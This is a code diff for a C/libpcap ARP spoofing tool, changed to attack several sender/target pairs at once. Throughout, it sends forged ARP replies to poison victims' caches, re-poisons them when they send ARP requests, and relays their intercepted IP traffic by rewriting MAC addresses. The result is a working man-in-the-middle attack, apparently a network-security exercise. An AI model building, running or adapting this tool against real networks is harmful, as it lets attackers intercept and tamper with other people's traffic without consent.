@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <unistd.h>
+#include <memory.h>
 #include <pcap.h>
 #include <time.h>
 #include "module.h"
@@ -15,6 +16,7 @@ int main(int argc, char* argv[]) {
     usage();
     return -1;
   }
+  const int SESSION_NUM = (argc - 2)/ 2;
 
   char * dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
@@ -25,40 +27,89 @@ int main(int argc, char* argv[]) {
     return -1;
   }
 
-  uint8_t sender_ip[IP_ADDR_LEN], target_ip[IP_ADDR_LEN], attacker_ip[IP_ADDR_LEN];
-  uint8_t attacker_mac_address[ETHER_ADDR_LEN], sender_mac_address[ETHER_ADDR_LEN], target_mac_address[ETHER_ADDR_LEN];
-  char attacker_ip_ori[16];
+  uint8_t sender_ip[SESSION_NUM][IP_ADDR_LEN], target_ip[SESSION_NUM][IP_ADDR_LEN], attacker_ip[SESSION_NUM][IP_ADDR_LEN];
+  uint8_t attacker_mac[SESSION_NUM][ETHER_ADDR_LEN], sender_mac[SESSION_NUM][ETHER_ADDR_LEN], target_mac[SESSION_NUM][ETHER_ADDR_LEN];
+  char attacker_ip_ori[SESSION_NUM][16];
+  bool atk_ok[SESSION_NUM], sdr_ok[SESSION_NUM], trg_ok[SESSION_NUM];
+  bool active[SESSION_NUM];
 
-  parseIP(sender_ip, argv[2]);
-  parseIP(target_ip, argv[3]);
-  printIPAddress("Sender ip", sender_ip);
-  printIPAddress("Target ip", target_ip);
+  for(int i = 0; i < SESSION_NUM; i++) {
+    parseIP(sender_ip[i], argv[2 + 2 * i]);
+    parseIP(target_ip[i], argv[3 + 2 * i]);
+    printIPAddress("Sender ip", sender_ip[i]);
+    printIPAddress("Target ip", target_ip[i]);
 
-  getAttackerIPAddress(attacker_ip_ori, dev);
-  parseIP(attacker_ip, attacker_ip_ori);
-  printIPAddress("Attacker ip", attacker_ip);
+    getAttackerIPAddress(attacker_ip_ori[i], dev);
+    parseIP(attacker_ip[i], attacker_ip_ori[i]);
+    printIPAddress("Attacker ip", attacker_ip[i]);
 
-  bool atk_ok = getAttackerMacAddress(attacker_mac_address, dev);
-  printMacAddress("Attacker Mac Address", atk_ok ? attacker_mac_address : NULL);
+    atk_ok[i] = getAttackerMacAddress(attacker_mac[i], dev);
+    printMacAddress("Attacker Mac Address", atk_ok[i] ? attacker_mac[i] : NULL);
 
-  bool sdr_ok = getMacAddress(handle, sender_mac_address, attacker_mac_address, attacker_ip, sender_ip);
-  printMacAddress("Sender Mac Address", sdr_ok ? sender_mac_address : NULL);
+    sdr_ok[i] = getMacAddress(handle, sender_mac[i], attacker_mac[i], attacker_ip[i], sender_ip[i]);
+    printMacAddress("Sender Mac Address", sdr_ok[i] ? sender_mac[i] : NULL);
 
-  bool trg_ok = getMacAddress(handle, target_mac_address, attacker_mac_address, attacker_ip, target_ip);
-  printMacAddress("Target Mac Address", trg_ok ? target_mac_address : NULL);
-
-  if(!(atk_ok && sdr_ok && trg_ok)) return 0;
+    trg_ok[i] = getMacAddress(handle, target_mac[i], attacker_mac[i], attacker_ip[i], target_ip[i]);
+    printMacAddress("Target Mac Address", trg_ok[i] ? target_mac[i] : NULL);
+    
+    printf("\n\n");
+    if(atk_ok[i] && sdr_ok[i] && trg_ok[i]) active[i] = true;
+  }
   
-  if(atk_ok && sdr_ok) {
-    time_t start = time(NULL);
-    while(true) {
-      time_t cur = time(NULL);
-      if(cur - start >= PERIOD) {
-        sendArpPacket(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip, 2);
-        start = cur;
+  time_t start = time(NULL);
+  while(true) {
+    time_t cur = time(NULL);
+    if(cur - start >= PERIOD) {
+      for(int i = 0; i < SESSION_NUM; i++) {
+        if(!active[i]) continue;
+        sendArpPacket(handle, attacker_mac[i], sender_mac[i], target_ip[i], sender_ip[i], 2);
       }
-      afterHack(handle, attacker_mac_address, target_mac_address, sender_mac_address, sender_ip, target_ip);
-      sleep(1);
+      start = cur;
+    }
+
+    struct pcap_pkthdr * header;
+    const u_char * packet;
+
+    int res = pcap_next_ex(handle, &header, &packet);
+    if(res == 0) continue;
+    if(res < 0) break;
+
+    struct ether_header * ether_pkt = (struct ether_header *)packet;
+    if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
+      struct arp_packet * arp_pkt = (struct arp_packet *)packet;
+
+      for(int i = 0; i< SESSION_NUM; i++) {
+        if(!active[i]) continue;
+        if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sender_mac[i]) && cmpIPAddress(arp_pkt -> arp_hdr.arp_tpa, target_ip[i])) {
+            sendArpPacket(handle, attacker_mac[i], sender_mac[i], target_ip[i], sender_ip[i], 2);
+        }
+      }
+    }
+
+    else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
+      struct ip_packet * ip_pkt = (struct ip_packet *)packet;
+      u_char * send_packet = (u_char *)malloc(header -> caplen);
+
+      for(int i = 0; i< SESSION_NUM; i++) {
+        if(!active[i]) continue;
+        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sender_mac[i]) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, attacker_mac[i]) && cmpIPAddress((uint8_t *)&(ip_pkt -> ip_hdr.ip_src), sender_ip[i])) {
+          printf("\n[+] Send Relay Packet!\n");
+          printMacAddress("  Old Src MAC", ip_pkt -> eth_hdr.ether_shost);
+          printMacAddress("  Old Dst MAC", ip_pkt -> eth_hdr.ether_dhost);
+          memcpy(ip_pkt -> eth_hdr.ether_shost, attacker_mac[i], ETHER_ADDR_LEN);
+          memcpy(ip_pkt -> eth_hdr.ether_dhost, target_mac[i], ETHER_ADDR_LEN);
+          printMacAddress("  New Src MAC", ip_pkt -> eth_hdr.ether_shost);
+          printMacAddress("  New Dst MAC", ip_pkt -> eth_hdr.ether_dhost);
+
+          memcpy(send_packet, packet, header -> caplen);
+          memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));
+
+          printIPAddress("  Source IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_src));
+          printIPAddress("  Target IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_dst));
+          pcap_sendpacket(handle, send_packet, header -> caplen);
+        }
+      }
+      free(send_packet);
     }
   }
 
